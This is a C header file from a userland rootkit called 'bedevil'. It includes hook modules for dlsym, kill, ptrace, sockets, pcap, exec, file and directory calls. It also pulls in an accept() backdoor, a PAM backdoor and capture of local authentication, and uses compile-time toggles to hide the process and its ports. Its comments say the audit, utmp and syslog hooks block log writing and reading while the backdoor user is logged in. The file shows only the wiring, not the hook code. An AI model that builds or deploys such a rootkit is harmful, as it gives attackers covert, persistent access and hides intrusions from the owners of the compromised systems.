/* all of the headers within this file will be read during setup
 * for possible variable placeholders.
 * if a variable is required by a toggleable aspect of the rootkit,
 * and the said toggle is disabled, the variable is ignored. */

#ifndef INCLUDES_H
#define INCLUDES_H

#include "bedevil.h"

/* we need libdl.h right now as it provides essential
 * symbol resolving functions. (hook, call, getsym)
 * not to mention the dlsym hook itself. */
#include "hooks/libdl/libdl.h"
#include "util/util.h"  /* now include util.h */
#include "hiding/hiding.h"

#ifdef USE_ACCEPT_BD
#include "backdoor/accept.h"
#endif

#ifdef USE_PAM_BD
#include "backdoor/pam.h"
#endif

#ifdef LOG_LOCAL_AUTH
#include "hooks/authlog/authlog.h"
#endif

#ifdef HIDE_SELF
int kill(pid_t pid, int sig);
#include "hooks/kill.c"
long ptrace(void *request, pid_t pid, void *addr, void *data);
#include "hooks/ptrace.c"
#endif

#ifdef HIDE_PORTS
int ssme(int domain, int protocol);
int socket(int domain, int type, int protocol);
#include "hooks/socket.c"
#include "hooks/pcap/pcap.h"
#endif

#include "hooks/exec/exec.h"
#include "hooks/open/open.h"
#include "hooks/stat/stat.h"
//#include "hooks/rw/rw.h"
#include "hooks/dir/dir.h"
#include "hooks/ln/links.h"
#include "hooks/gid/gid.h"
#include "hooks/perms/perms.h"

#ifdef USE_PAM_BD
#include "hooks/pwd/pwd.h"

#ifdef HIDE_SELF
/* the functions in the following includes
 * are responsible for thwarting writing &
 * reading of logs when the backdoor user
 * is logged in. */
#include "hooks/audit/audit.h"
#include "hooks/utmp/utmp.h"
#include "hooks/syslog/syslog.h"
#endif
#endif

#endif